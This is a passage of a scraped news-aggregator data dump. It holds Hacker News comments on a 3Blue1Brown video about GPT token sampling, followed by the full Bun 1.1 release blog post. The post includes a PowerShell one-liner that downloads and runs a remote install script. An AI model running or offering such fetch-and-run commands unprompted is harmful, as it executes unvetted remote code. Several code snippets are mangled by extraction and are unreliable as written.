undefined answer than there are to express a naively incorrect answer, the correct answer is split across more tokens so that even if eg the softmax value of \"1\" is 0.1 and across \"although\"+\"because\"+\"due to\"+\"unfortunately\">0.3, at temperature of 0, \"1\" gets chosen. At slightly higher temperatures, sampling across all outputs would increase the probability of a correct answer. So it's true that increasing the temperature increases the probability that the model outputs tokens other than the single-most-likely token, but that might be what you want. Temperature purely controls the distribution of tokens, not \"answers\". reply Newlaptop 8 hours agorootparentNot sure if you were making a joke, but 0^0 is often defined as 1. https://en.wikipedia.org/wiki/Zero_to_the_power_of_zero reply zild3d 1 hour agorootparentperhaps a hallucination reply weitendorf 6 hours agorootparentprevI honestly had forgot that, if I ever knew it. But I think the point stands that in many contexts you'd rather have the nuances of this kind of thing explained to you - able to represented by many different sequences of tokens, each individually being low probability - instead of simply taking the single-highest probability token \"1\". reply zild3d 1 hour agorootparentI'd rather it recognize it should enter a calculator mode to evaluate the expression, and then can give context with the normal GPT behavior reply x-complexity 8 hours agorootparentprev> Can this be potentially dangerous -- e.g. if a user types \"The answer to the expression 2 + 2 is\", isn't there a chance it chooses an output beyond the most likely one? This is where the semi-ambiguity of the human languages helps a lot with. There are multiple ways to answer with \"4\" that are acceptable, meaning that it just needs to be close enough to the desired outcome to work. This means that there isn't a single point that needs to be precisely aimed at, but a broader plot of space that's relatively easier to hit. The hefty tolerances, redundancies, & general lossiness of the human language act as a metaphorical gravity well to drag LLMs to the most probable answer. reply pelillian 4 hours agorootparentprevThat’s why we use top p and top k! They limit the probability space to a certain % or number of tokens ordered by likelihood reply jldugger 10 hours agorootparentprevYes, but the chance is quite small if the gap between \"4\" and any other token is quite large. reply MrYellowP 3 hours agorootparentprev> potentially dangerous > 2 + 2 You really couldn't come up with an actual example of something that would be dangerous? I'd appreciate that, because I'm not seeing reason to believe that an \"output beyond the most likely one\" output would end up ever being dangerous, as in, harming someone or putting someone's life at risk. Thanks. reply autoexec 2 hours agorootparentThat depends on how many people are putting blind faith in terrible AI. If it's your doctor or your parole board, AI making a mistake could be horrible for you. reply davekeck 11 hours agorootparentprev> then some lower probability tokens may be chosen Can you explain how it chooses one of the lower-probability tokens? Is it just random? reply acchow 10 hours agorootparentReducing temperature reduces the impact of differences between raw output values giving a higher probability to pick other tokens. reply acchow 8 hours agorootparentOops backwards. Increasing temperature... reply not_a_dane 11 hours agorootparentprevIt is the part of softmax layer, but not all the time. reply user_7832 12 hours agorootparentprevThanks, learnt something new today! reply ahzhou 6 hours agoparentprevYes, this is a fundamental weakness with LLMs. Unfortunately this is likely unsolvable because the search space is exponential. Techniques like beam search help, but can only introduce a constant scaling factor. That said, LLM reach their current performance despite this limitation. reply mvsin 12 hours agoparentprevSomething like this does exist, production systems rarely use greedy search but have more holistic search algorithms. An example is Beam Search:https://www.width.ai/post/what-is-beam-search Essentially we keep a window of probabilities of predicted tokens to improve the final quality of output. reply user_7832 12 hours agorootparentThanks, that's exactly what I was looking for! Any idea if it's possible to use beam search on local models like mistral? It sounds like the choice of beam search vs say top-p or top-k should be in the software and not embedded, right? reply activatedgeek 11 hours agorootparentIf you use HuggingFace models, then a few simpler decoding algorithms are already implemented for `generate` method of all supported models. Here is a blog post that describes it: https://huggingface.co/blog/how-to-generate. I will warn you though that beam search is typically what you do NOT want. Beam search approximately optimizes for the \"highest likely sequence at the token level.\" This is rarely what you need in practice with open-ended generations (e.g. a question-answering chat bot). In practice, you need \"highest likely semantic sequence,\" which is much harder problem. Of course, various approximations for semantic alignment are currently in the literature, but still a wide open problem. reply yunohn 12 hours agorootparentprevThis is actually a great question for which I found an interesting attempt: https://andys.page/posts/llm_sampling_strategies/ (No affiliation) reply qeternity 7 hours agorootparentprev> production systems rarely use greedy search I have no idea why you say this. Most of our pipelines will run greedy, for reproducibility. Maybe we turn the temp up if we are returning conversational text back to a user. reply chessgecko 9 hours agoparentprevThere’s some fancier stuff too like techniques that take into account where recent tokens were drawn from in the distribution and update either the top_p or the temperature so that sequences of tokens have a minimum unlikeliness. Beam search is less common with really large models because the computation is really expensive. reply lxe 11 hours agoparentprevThere's a whole bunch of different normalization and sampling techniques that you can perform that can alter the quality or expressiveness of the model, e.g. https://docs.sillytavern.app/usage/common-settings/#sampler-... reply lucidrains 14 hours agoprevI can't think of anyone better to teach attention mechanism to the masses. This is a dream come true reply acchow 13 hours agoparentIncredible. This 3B1B series was started 6 years ago and keeps going today with chapter 5. If you haven't seen the first few chapters, I cannot recommend enough. reply user_7832 12 hours agorootparentWould you be able to compare them to Andrew Ng's course? reply mFixman 58 minutes agorootparentIMO the style, formatting, and animations in 3B1B videos is what Coursera courses should have been about in the first place. Andrew Ng's course doesn't use video effectively at all: half of each class is Andrew talking to the camera, while the other half is him slowly writing things down with a mouse. There's a reason why a lot of people recommend watching at 1.5x speed. Online classes are online classes. If they try to make copy in-person classes, like most Coursera courses do, they will keep all of the weaknesses of online classes without any of its strengths. reply abraxas 9 hours agorootparentprevI personally preferred Andrej Karpathy's CS231n taught by him and his private videos about neural nets in general and transformers in particular. He has a youtube vid where he builds one from scratch in Python! 3BlueOneBrown videos are a great complement to Karpathy's lectures to aid in visualising what is going on. reply sk11001 12 hours agorootparentprevThey're not really comparable - if you're wondering if you should do one or the other, you should do both. reply ctrw 11 hours agorootparentprevThe way you compare a technical drawing of a steam engine to The Fighting Temeraire oil painting. reply Vespasian 12 hours agoprevIf you liked that, Andrej karpathy has a few interesting videos on his channels explaining Neural Networks and their inner workings which are aimed at people who know how to program. reply jtonz 11 hours agoparentAs a reasonably experienced programmer that has watched Andrej's videos the one thing I would recommend is that they not be used as a starting point to learn neural networks but as a reinforcement or enhancement method once you know the fundamentals. I was ignorant enough to try and jump straight in to his videos and despite him recommending I watch his preceeding videos I incorrectly assumed I could figure it out as I went. There is verbiage in there that you simply must know to get the most out of it. After giving up, going away and filling in the gaps though some other learnings, I went back and his videos become (understandably) massively more valueable for me. I would strongly recommend anyone else wanting to learn neural networks that they learn from my mistake. reply kovrik 11 hours agorootparentCould you please share what other learning materials you used? reply 6mian 3 hours agorootparentFor me 3brown1blue series: https://m.youtube.com/watch?v=aircAruvnKk was an excellent introduction that made Andrej's videos understandable. Then I did 3 first chapters of fastai book, but found it too high level, while I was interested in how things works under the hood. Going through Andrej's makemore tutorials required quite a lot of time but it's definitely worth it. I used free tier of Google Colab until the last one. Pausing the video a lot after he explains what he plans to do and trying to do it by myself was a very rewarding way to learn, with a lot of \"aha\" moments. reply yinser 13 hours agoprevWhat an unbelievable salve for all the April Fool's content. Pipe this directly into my veins. reply Terr_ 7 hours agoprevAlso relevant would be this interactive visualization: https://bbycroft.net/llm Prior discussion: https://news.ycombinator.com/item?id=38505211 reply throwawayk7h 11 hours agoprevThe next token is taken by sampling the logits in the final column after unembedding. But isn't that just the last token again? Or is the matrix resized to N+1 at some step? reply HarHarVeryFunny 10 hours agoparentThere is an end-of-sequence token appended to the input sequence, and this is what is transformed into the predicted next token. reply lxe 11 hours agoprevCan't wait for the next videos. I think I'll finally be able to internalize and understand how these things work. reply __loam 11 hours agoprev [–] 3B1B is one of the best stem educators in YouTube. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "GPT is a text generation model trained on vast data using a transformer neural network, like GPT-3 with 175 billion parameters, leveraging deep learning for data processing.",
      "Matrices, word embeddings, and softmax functions are vital for GPT's coherence in generating text, crucial for natural language processing and conversation responses.",
      "The discussion emphasizes the significance of embeddings in higher-dimensional spaces, matrix manipulations in text processing, and softmax's role in text distribution generation."
    ],
    "commentSummary": [
      "The post examines GPT models and key parameters in generative models such as Transformers, like beam search, temperature, and top_k, delving into the challenges of predicting the next token in text sequences.",
      "It underlines the risks of opting for lower probability tokens and suggests strategies like beam search and top p to address this concern.",
      "Additionally, it contrasts teaching approaches in neural networks by prominent educators, advising a mix of learning materials, while users share the advantages of Google Colab and interactive visual aids for education."
    ],
    "points": 387,
    "commentCount": 46,
    "retryCount": 0,
    "time": 1712000260
  },
  {
    "id": 39895744,
    "title": "Bun 1.1 Update Boosts JavaScript and TypeScript Development",
    "originLink": "https://bun.sh/blog/bun-v1.1",
    "originBody": "Bun is a fast, all-in-one toolkit for running, building, testing, and debugging JavaScript and TypeScript, from a single script to a full-stack application. If you're new to Bun, you can learn more in the Bun 1.0 blog post. Bun 1.1 is huge update. There's been over 1,700 commits since Bun 1.0, and we've been working hard to make Bun more stable and more compatible with Node.js. We've fixed over a thousand bugs, added tons of new features and APIs, and now, Bun supports Windows! Windows Support You can now run Bun on Windows 10 and later! This is a huge milestone for us, and we're excited to bring Bun to a whole new group of developers. Bun on Windows passes 98% of our own test suite for Bun on macOS and Linux. That means everything from the runtime, test runner, package manager, bundler — it all works on Windows. To get started with Bun on Windows, run the following command in your terminal: > powershell -c \"irm bun.sh/install.ps1iex\" bun install on Windows Bun has a built-in, npm-compatible package manager that installs packages. When installing a Vite React App, bun install runs 18x faster than yarn and 30x faster than npm on Windows. Time spent installing dependencies in a vite react app using `--ignore-scripts` on Windows. bun run on Windows You can also run scripts using bun run, which is a faster alternative to npm run. To make bun run even faster on Windows, we engineered a new file-format: .bunx. The .bunx file is a cross-filesystem symlink that is able to start scripts or executables using Bun or Node.js. We decided to create this for several reasons: Symlinks are not guaranteed to work on Windows. Shebangs at the top of a file (#!/usr/bin/env bun) are not read on Windows. We want to avoid creating three permutations of each executable: .cmd, .sh, and .ps1. We want to avoid confusing \"Terminate batch job? (Y/n)\" prompts. The end result is that bun run is 11x faster than npm run, and bunx is also 11x faster than npx. Time spent running `bunx cowsay` vs `npx cowsay` on Windows. Even if you only use Bun as a package manager and not a runtime, .bunx just works with Node.js. This also solves the annoying \"Terminate batch job?\" prompt that Windows developers are used to when sending ctrl-c to a running script. bun --watch on Windows Bun has built-in support --watch mode. This gives you a fast iteration cycle between making changes and having those changes affect your code. On Windows, we made to sure to optimize the time it takes between control-s and process reload. On the left, making changes to a test file. On the right, `bun test --watch` on Windows. Node.js APIs on Windows We've also spent time optimizing Node.js APIs to use the fastest syscalls available on Windows. For example, fs.readdir() on Bun is 58% faster than Node.js on Windows. Time spent listing files in a directory, 1000 times on Windows. While we haven't optimized every API, if you notice something on Windows that is slow or slower than Node.js, file an issue and we will figure out how to make it faster. Bun is a JavaScript runtime Windows support is just one anecdote when compared to the dozens of new features, APIs, and improvements we've made since Bun 1.0. Large projects start 2x faster Bun has built-in support for JavaScript, TypeScript, and JSX, powered by Bun's very own transpiler written in highly-optimized native code. Since Bun 1.0, we've implemented a content-addressable cache for files larger than 50KB to avoid the performance overhead of transpiling the same files repeatedly. This makes command-line tools, like tsc, run up to 2x faster than in Bun 1.0. Time spent running `tsc --help` in Bun and Node.js. The Bun Shell Bun is now a cross-platform shell — like bash, but also on Windows. JavaScript is the world's most popular scripting language. So, why is running shell scripts so complicated? import { spawnSync } from \"child_process\"; // this is a lot more work than it could be const { status, stdout, stderr } = spawnSync(\"ls\", [\"-l\", \"*.js\"], { encoding: \"utf8\", }); Different platforms also have different shells, each with slightly different syntax rules, behavior, and even commands. For example, if you want to run a shell script using cmd on Windows: rm -rf doesn't work. FOO=bardoesn't work. which doesn't exist. (it's called where instead) The Bun Shell is a lexer, parser, and interpreter that implements a bash-like programming language, along with a selection of core utilities like ls, rm, and cat. The shell can also be run from JavaScript and TypeScript, using the Bun.$ API. import { $ } from \"bun\"; // pipe to stdout: await $`ls *.js`; // pipe to string: const text = await $`ls *.js`.text(); The syntax makes it easy to pass arguments, buffers, and pipes between the shell and JavaScript. const response = await fetch(\"https://example.com/\"); // pipe a response as stdin, // pipe the stdout back to JavaScript: const stdout = await $`gzip -c{ for (const name in headers) { console.log(`${name}: ${headers[name]}`); // \"cache-control: max-age=604800\", ... } }); request.on(\"end\", () => { client.close(); }); request.end(); We're still working on adding support for the HTTP/2 server, you can track our progress in this issue. Date.parse() compatible with Node.js Bun uses JavaScriptCore as its JavaScript engine, as opposed to Node.js which uses V8. Date parsing is complicated, and its behaviour varies greatly between engines. For example, in Bun 1.0 the following Date would work in Node.js, but not in Bun: const date = \"2020-09-21 15:19:06 +00:00\"; Date.parse(date); // Bun: Invalid Date Date.parse(date); // Node.js: 1600701546000 To fix these inconsistencies, we ported the Date parser from V8 to Bun. This means that Date.parse and new Date() behave the same in Bun as it does in Node.js. Recursive fs.readdir() In Bun 1.0, we did not have support for the recursive option in fs.readdir(). This was an oversight and caused subtle bugs with many packages. Not only did we add support for the recursive option, but we also made is 22x faster than Node.js. Time spent listing files using recursive `fs.readdir()` in a large directory. IPC support between Bun and Node.js You can now send IPC messages between Bun and Node.js processes using the ipc option. This also fixed a bug that would have caused Bun to hang when using Next.js 14.1. if (typeof Bun !== \"undefined\") { const prefix = `[bun ${process.versions.bun} 🐇]`; const node = Bun.spawn({ cmd: [\"node\", __filename], ipc({ message }) { console.log(message); node.send({ message: `${prefix} 👋 hey node` }); node.kill(); }, stdio: [\"inherit\", \"inherit\", \"inherit\"], serialization: \"json\", }); node.send({ message: `${prefix} 👋 hey node` }); } else { const prefix = `[node ${process.version}]`; process.on(\"message\", ({ message }) => { console.log(message); process.send({ message: `${prefix} 👋 hey bun` }); }); } Undocumented Node.js APIs Node.js has lots of undocumented APIs that you wouldn't find from reading its documentation. There are millions of npm packages, inevitably some of them will depend on obscure or undocumented APIs. Instead of leaving these packages to be broken or forgotten, we actually add these APIs to Bun so you don't need to rewrite your code. For example, ServerResponse has an undocumented _headers property that allows the HTTP headers to be modified as an object. import { createServer } from \"node:http\"; createServer((req, res) => { const { _headers } = res; delete _headers[\"content-type\"]; res._implicitHeader(); res.end(); }); This API was used in recent Astro release, which we then fixed in Bun. There was also an _implicitHeader() function, which was used by Express, and we also fixed that. So much more There's also a ton of other Node.js APIs that we've either added or fixed, including: Module APIs Top-level Added import.meta.filename, import.meta.dirname, module.parent process Added getReport(), binding(\"tty_wrap\") node:util Added domainToASCII(), domainToUnicode(), and styleText(). Changed inspect() to be more consistent with Node.js node:crypto Added KeyObject, createPublicKey(), createPrivateKey(),generateKeyPair(), generateKey(), sign(), verify(), and more node:fs Added openAsBlob(), opendir(), fdatasync(). Fixed FileHandle not being returned with various APIs node:console Added Console node:dns Added lookupService() node:http Unix domain sockets via request() node:events Added on() node:path Fixed many bugs with Windows paths. node:vm Added createScript() node:os Added availableParallelism() Web APIs Bun also supports the Web standard APIs, including fetch() and Response. This makes it easier to write code that works in both the browser and Bun. Since Bun 1.0, we've made a lot of improvements and fixes to the Web APIs. WebSocket is stable Previously, WebSocket was marked as experimental due to protocol bugs, such as early disconnects and fragmentation issues. In Bun 1.1, WebSocket is now stable and passes the industry-standard Autobahn conformance test suite. This fixes dozens of bugs the WebSocket client and makes it more reliable for production use. const ws = new WebSocket(\"wss://echo.websocket.org/\"); ws.addEventListener(\"message\", ({ data }) => { console.log(\"Received:\", data); }); ws.addEventListener(\"open\", () => { ws.send(\"Hello!\"); }); performance.mark() Bun now supports the user-timings APIs, which includes APIs like performance.mark() and performance.measure(). This is useful for measuring the performance of your application. performance.mark(\"start\"); while (true) { // ... } performance.mark(\"end\"); performance.measure(\"task\", \"start\", \"end\"); fetch() using Brotli compression You can now use fetch() to make requests with the br encoding. This is useful for making requests to servers that support Brotli compression. const response = await fetch(\"https://example.com/\", { headers: { \"Accept-Encoding\": \"br\", }, }); URL.canParse() Bun now supports the recently-added URL.canParse() API. This makes it possible to check if a string is a valid URL without throwing an error. URL.canParse(\"https://example.com:8080/\"); // true URL.canParse(\"apoksd!\"); // false fetch() over Unix sockets Bun now supports sending fetch() requests over a Unix socket. const response = await fetch(\"http://localhost/info\", { unix: \"/var/run/docker.sock\", }); const { ID } = await response.json(); console.log(\"Docker ID:\", ID); //While this not an API that browsers will support, it's useful for server-side applications that need to communicate with services over a Unix socket, like the Docker daemon. Response body as an AsyncIterator You can now pass an AsyncIterator to the Response constructor. This is useful for streaming data from a source that doesn't support ReadableStream. const response = new Response({ async *[Symbol.asyncIterator]() { yield \"Hello, \"; yield Buffer.from(\"world!\"); }, }); await response.text(); // \"Hello, world!\" This is a non-standard extension to the fetch() API that Node.js supported, and was added to Bun for compatibility reasons. Other changes Implemented console.table(), console.timeLog() Supported ignoreBOM in TextEncoder Bun is an npm-compatible package manager Even if you don't use Bun as a runtime, you can still use bun install as a package manager. Bun is an npm-compatible package manager that installs packages up to 29x faster than npm. Since Bun 1.0, we have significantly improved the stability and performance of bun install. We've fixed hundreds of bugs, added new features, and improved the overall developer experience. Lifecycle scripts If you ran into a bug using bun install in Bun 1.0, chances are it was related to lifecycle scripts. Lifecycle scripts are scripts that run during the installation of a package, such as postinstall. In Bun 1.1, we've fixed many of those bugs and completely overhauled how lifecycle scripts work. Lifecycle scripts on Windows On Windows, lifecycle scripts use the Bun Shell. That means you don't need helper libraries like: rimraf cross-env node-which trustedDependencies By default, Bun does not run lifecycle scripts for packages that are not trusted. This is a security feature to prevent malicious scripts from running on your machine. Bun will only run scripts that are defined in the trustedDependencies list in your package.json. When you first add a package, Bun will tell you if the package had a lifecycle script that did not run. bun add v1.1.0 Saved lockfile installed @biomejs/biome@1.6.1 with binaries: - biome 1 package installed [55.00ms] Blocked 1 postinstall. Run `bun pm untrusted` for details. bun pm untrusted If you want to see which scripts were blocked, you can run bun pm untrusted. bun pm untrusted v1.1.0 ./node_modules/@biomejs/biome @1.6.1 » [postinstall]: node scripts/postinstall.js These dependencies had their lifecycle scripts blocked during install. If you trust them and wish to run their scripts, use `bun pm trust`. bun pm trust If you trust the package, you can run bun pm trust [package]. If you want to trust every package, you can also run bun pm trust --all. bun pm trust v1.1.0 ./node_modules/@biomejs/biome @1.6.1 ✓ [postinstall]: node scripts/postinstall.js 1 script ran across 1 package [71.00ms] bun add --trust If you already know you want to trust a dependency, you can add it using bun add --trust [package]. This will add the package and it's transitive dependencies to your trustedDependencies list so you don't need to run bun pm trust for that package. { \"dependencies\": { \"@biomejs/biome\": \"1.6.1\" }, \"trustedDependencies\": [ \"@biomejs/biome\" ] } Bun includes a default allowlist of popular packages containing lifecycle scripts that are known to be safe. You can see the full list by running bun pm default-trusted. Also, to reduce the performance impact of lifecycle scripts, we've made them run in parallel. This means that lifecycle scripts will run concurrently, which reduces the time it takes to install packages. bun pm migrate Bun uses a binary lockfile, bun.lockb, for faster installs with bun install. You can now run bun pm migrate to convert a package-lock.json file to a bun.lockb file. This is useful if you want to do a one-time migration from npm to Bun. bun pm migrate [5.67ms] migrated lockfile from package-lock.json 21 packages installed [54.00ms] You don't need to run this command if you're using bun install, as it will automatically migrate the lockfile if it detects a package-lock.json file. Bun is a JavaScript bundler Bun is a JavaScript and TypeScript bundler, transpiler, and minifier that can be used to bundle code for the browser, Node.js, and other platforms. bun build --target=node Bun can bundle code to run on Node.js using the --target=node flag. var { promises } = require(\"node:fs\"); var { join } = require(\"node:path\"); promises.readFile(join(__dirname, \"data.txt\")); In Bun 1.0, there were several bugs that prevented this from working correctly, such as not being able to require built-in modules like node:fs and node:path. Here's what that looked like in Bun 1.0: bun-1.0 build --target=node app.ts --outfile=dist.mjs node dist.mjs TypeError: (intermediate value).require is not a function at __require (file:///app.mjs:2:22) at file:///app.mjs:7:20 at ModuleJob.run (node:internal/modules/esm/module_job:218:25) at async ModuleLoader.import (node:internal/modules/esm/loader:329:24) at async loadESM (node:internal/process/esm_loader:28:7) at async handleMainPromise (node:internal/modules/run_main:113:12) In Bun 1.1, these bugs have now been fixed. bun build --target=node app.ts --outfile=dist.mjs node dist.mjs bun build --compile Bun can compile TypeScript and JavaScript files to a single-file executable using the --compile flag. bun build --compile app.ts ./app Hello, world! In Bun 1.1, you can also embed NAPI (n-api) addons .node files. This is useful for bundling native Node.js modules, like @anpi-rs/canvas. import { promises } from \"fs\"; import { createCanvas } from \"@napi-rs/canvas\"; const canvas = createCanvas(300, 320); const data = await canvas.encode(\"png\"); await promises.writeFile(\"empty.png\", data); Then you can compile and run your application as a single-file executable. bun build --compile canvas.ts ./canvas # => simple.png Macros Bun has a powerful macro system that allows you to transform your code at compile-time. Macros can be used to generate code, optimize code, and even run code at compile-time. In Bun 1.1, you can now import built-in modules at bundle-time. Read a file into a string at bundle-time import { readFileSync } from \"node:fs\" with { type: \"macro\" }; export const contents = readFileSync(\"hello.txt\", \"utf8\"); Spawn a process at bundle-time import { spawnSync } from \"node:child_process\" with { type: \"macro\" }; const result = spawnSync(\"echo\", [\"Hello, world!\"], {encoding: \"utf-8\"}).stdout; console.log(result); // \"Hello, world!\" Bun is a test runner Bun has a built-in test module that makes it easy to write and run tests in JavaScript, TypeScript, and JSX. It supports the same APIs as Jest, which includes the expect()-style APIs. Matchers Matchers are assertions that you can use to test your code. Since Bun 1.0, we've added dozens of new expect() matchers, including: import { expect } from \"bun:test\"; expect.hasAssertions(); expect.assertions(9); expect({}).toBeObject(); expect([{ foo: \"bar\" }]).toContainEqual({ foo: \"bar\" }); expect(\" foo \").toEqualIgnoringWhitespace(\"foo\"); expect(\"foo\").toBeOneOf([\"foo\", \"bar\"]); expect({ foo: Math.PI }).toEqual({ foo: expect.closeTo(3.14) }); expect({ a: { b: 1 } }).toEqual({ a: expect.objectContaining({ b: 1 }) }); expect({ a: Promise.resolve(\"bar\") }).toEqual({ a: expect.resolvesTo(\"bar\") }); expect({ b: Promise.reject(\"bar\") }).toEqual({ b: expect.rejectsTo(\"bar\") }); expect.unreachable(); Custom matchers with expect.extend() If there's a matcher that Bun doesn't support, you can create your own using expect.extend(). This is useful when you want to define a custom matcher that is reusable across multiple tests. import { test, expect } from \"bun:test\"; expect.extend({ toBeWithinRange(received, floor, ceiling) { const pass = received >= floor && received`Expected ${received} not to be within range ${floor} - ${ceiling}`, pass: true, }; } else { return { message: () => `Expected ${received} to be within range ${floor} - ${ceiling}`, pass: false, }; } }, }); test(\"toBeWithinRange()\", () => { expect(1).toBeWithinRange(1, 99); // ✅ expect(100).toBeWithinRange(1, 99); // ❌ Expected 100 to be within range 1 - 99 }); Module mocking Bun now supports module mocking. Unlike Jest, Bun is able to mock both ESM and CommonJS modules. If a module has already been imported, Bun is able to update the module in-place, which means that mocks work at runtime. Other test runners can't do this, since they set mocks at build time. You can override anything: local files, npm packages, and built-in modules. file.js package.js built-in.js import { mock, test, expect } from \"bun:test\"; import { fn } from \"./mock\"; test(\"mocking a local file\", async () => { mock.module(\"./mock\", () => { return { fn: () => 42, }; }); // fn is already imported, so it will be updated in-place expect(fn()).toBe(42); // also works with cjs expect(require(\"./mock\").fn()).toBe(42); }); Bun has built-in support for SQLite Since 1.0, Bun has had built-in support for SQLite. It has an API that's inspired by better-sqlite3, but is written in native code to be faster. import { Database } from \"bun:sqlite\"; const db = new Database(\":memory:\"); const query = db.query(\"select 'Bun' as runtime;\"); query.get(); // { runtime: \"Bun\" } Since then, there's been lots of new features and improvements to bun:sqlite. Multi-statement queries We've added support for multi-statement queries, which allows multiple SQL statements to be run in a single call to run() or exec() delimited by a ;. import { Database } from \"bun:sqlite\"; const db = new Database(\":memory:\"); db.run(` CREATE TABLE users ( id INTEGER PRIMARY KEY, name TEXT ); INSERT INTO users (name) VALUES (\"Alice\"); INSERT INTO users (name) VALUES (\"Bob\"); `); Detailed errors When an error is thrown from bun:sqlite, you'll now see more detailed errors, including the table and column name. In Bun 1.0, the error message was terse and did not contain extra details. - error: constraint failed + SQLiteError: UNIQUE constraint failed: foo.bar + errno: 2067 + code: \"SQLITE_CONSTRAINT_UNIQUE\" at run (bun:sqlite:185:11) at /index.js:7:1 Import databases In Bun 1.1, you can now import a SQLite database using the import syntax. This uses the new import attributes feature to specify the type of import. import db from \"./users.db\" with { type: \"sqlite\" }; const { n } = db .query(\"SELECT COUNT(id) AS n FROM users\") .get(); console.log(`Found ${n} users!`); // \"Found 42 users!\" Embed databases You can also compile your application and SQLite database into a single-file executable. To enable this, specify the embed property on the import, then use bun build --compile to build your app. import db from \"./users.db\" with { type: \"sqlite\", embed: \"true\" }; bun build --compile ./app.ts ./app Found 42 users! Bun makes JavaScript simpler We spent a lot of time thinking about the developer experience in Bun. We want to make it easy to write, run, and debug JavaScript and TypeScript code. There are tons of improvements to commands, output, and error messages to make Bun easier to use. Syntax-highlighted errors When an error is thrown in Bun, it prints a stack trace to the console with a multi-line source code preview. Now that source code preview gets syntax highlighted, which makes it easier to read. A preview of errors with and without syntax highlighting. Simplified stack traces Stack traces from Error.stack now include less noise, such as internal functions that are not relevant to the error. This makes it easier to see where the error occurred. 1throw new Error(\"Oops\"); ^ error: Oops at /oops.js:1:7 at globalThis (/oops.js:3:14) at overridableRequire (:1:20) at /index.js:3:8 at globalThis (/index.js:3:8) bun --eval You can run bun --eval, or bun -e for short, to evaluate a script without creating a file. Just like the rest of Bun, it supports top-level await, ESM, CommonJS, TypeScript, and JSX. You can pass the script as a string. bun -e 'console.log(Bun.version)' 1.1.0 Or you can pipe the script through stdin using bun -. echo 'console.log(await fetch(\"https://example.com/\"))'bun - Response (1.26 KB) { status: 200, ... } bun --print You can also use bun --print, which is the same as bun -e, except it prints the last statement using console.log(). bun --print 'await Bun.file(\"package.json\").json()' { name: \"bun\", dependencies: { ... }, } You can also omit await since Bun will detect dangling promises. bun --print 'fetch(\"https://example.com/\").then(r => r.text())'... bun --env-file Bun detects and loads .env files by default, but now you can use bun --env-file to load a custom .env file. This is useful for testing different environments. bun --env-file=custom.env src/index.ts bun --env-file=.env.a --env-file=.env.b run build You can use --env-file when running JavaScript files or when running package.json scripts. Behaviour changes Bun 1.1 contains a few, minor tweaks in behaviour that you should be aware of, but we think are highly unlikely to break your code. Longer network timeouts In Bun 1.0, the default network timeout for fetch() and bun install was 30 seconds. Since Bun 1.0.4, the default network timeout has been increased to 5 minutes. This aligns the default with Google Chrome and should help with high-latency connections. You can also disable the timeout with fetch() using: const response = await fetch(\"https://example.com/\", { timeout: false, }); Bun.write() creates the parent directory Previously, Bun.write() would throw an error if the parent directory didn't exist. import { write } from \"bun\"; await write(\"does/not/exist/hello.txt\", \"Hello!\"); // ENOENT: No such file or directory Since Bun 1.0.16, Bun will create the parent directory if it doesn't exist. While this does not match the behaviour of APIs like fs.writeFileSync(), developers asked us to make this change so the API would be more intuituve to use and lead to a better developer experience. Without this change, developers would have to write the following boilterplate code: import { write } from \"bun\"; import { mkdir } from \"node:fs/promises\"; try { await write(\"does/not/exist/hello.txt\", \"Hello!\"); } catch (error) { if (error.code === \"ENOENT\") { await mkdir(\"does/not/exist\", { recursive: true }); await write(\"does/not/exist/hello.txt\", \"Hello!\"); } else { throw error; } } If you want to restore the old behavior, you can specify the createPath property. import { write } from \"bun\"; await write(\"does/not/exist/hello.txt\", \"Hello, world!\", { createPath: false }); // ENOENT: No such file or directory Conditional exports does not include worker Packages can use conditional exports to specify different entry files for different environments. For example, a package might define a browser export for the browser and a node export for Node.js. { \"exports\": { \"node\": \"./node.js\", \"browser\": \"./browser.js\", \"worker\": \"./worker.js\" } } In Bun 1.0, Bun would select the first export using the following order: bun, worker, node. In Bun 1.1, Bun will no longer select the worker export, since that is associated with Web Workers, which often assume a browser-like environment. This change only applies when Bun is being used as a runtime, and fixes various bugs where a worker export would be selected before a more-applicable node export. NODE_ENV is undefined by default In Node.js, process.env.NODE_ENV is set to undefined by default. Early in Bun's development, we set the default to be development which turned out to be a mistake. This is because developers often forget to set NODE_ENV to production, which can lead to development functionality being included in production builds. In Bun 1.1, we changed the default NODE_ENV to undefined to match Node.js. bun --print 'process.env.NODE_ENV' undefined NODE_ENV=development bun --print 'process.env.NODE_ENV' development bun install [package]@latest Previously, if you installed a package using the latest tag, it would write the literal string latest to your package.json. This was not intended and does not match the behavior of other package managers. In Bun 1.1, the latest tag is resolved before being written to the package.json. bun install lodash@latest package.json { \"dependencies\": { \"lodash\": \"latest\" \"lodash\": \"^4.17.21\" } } Bun.$ rejects with non-zero exit code The Bun shell was introduced in Bun 1.0.24. When a subprocess exited, the promise resolved even if the exit code was non-zero. import { $ } from \"bun\"; await $`cd /does/not/exist`; // does not throw This is often not the desired behavior, and would cause bugs to go unnoticed where a command failed but the promise resolved. In Bun 1.1, the Bun shell will now reject with an error when the subprocess exits with a non-zero exit code. import { $ } from \"bun\"; await $`cd /does/not/exist`; // ShellError: cd /does/not/exist: No such file or directory If you want to revert back to the previous behavior, you can call the throws() function. import { $ } from \"bun\"; const { exitCode, stderr } = await $`cd /does/not/exist`.throws(false); console.log(exitCode); // 1 console.log(stderr); // \"cd: /does/not/exist: No such file or directory\" import.meta.resolve() In Bun 1.0, import.meta.resolve() would asynchronously resolve to an absolute file path. This matched the behavior of Node.js' original implementation. However, for Web API compatibility reasons, Node.js changed the API to be synchronous. And so, Bun has done the same. import.meta.resolve(\"./foo.js\"); // Before: Promise { \"/path/to/foo.js\" } import.meta.resolve(\"./foo.js\"); // After: \"file:///path/to/foo.js\" A thousand bug fixes Since Bun 1.0, we've fixed over a thousand bugs. If you ran into an error using Bun 1.0, we'd encourage you to try again with Bun 1.1. And if there's still something we haven't fixed, please feel free to create a new issue or bump an existing one. You can upgrade to Bun 1.1 with the following command: bun upgrade Notable fixes Out of the thousands of bugs fixed, here are a few of the most common issues that you may have encountered, that have now been fixed. Module not found after running bun install. WebSocket errors or early disconnects. Bun.file would sometimes cause an EBADF: Bad file descriptor error. bun install would resolve an incorrect version if certain pre/post tags were present. bun install --yarn would sometimes generate invalid YAML. Failed to start server. Is port in use? inside Docker containers. \"pidfd_open(2)\" system call is not supported on Vercel and Google Cloud. Bun.serve() not responding to HTTP requests with an _ header. Listening to 0.0.0.0 would bind to IPv6 as well. process.nextTick() and setImmediate() would execute in a different order than Node.js. Performance improvements We are constantly making changes to Bun so it can be faster and more efficient. Follow @bunjavascript to get the latest digest of \"In the next version of Bun.\" Here is a snippet of some of the performance improvements made since Bun 1.0: 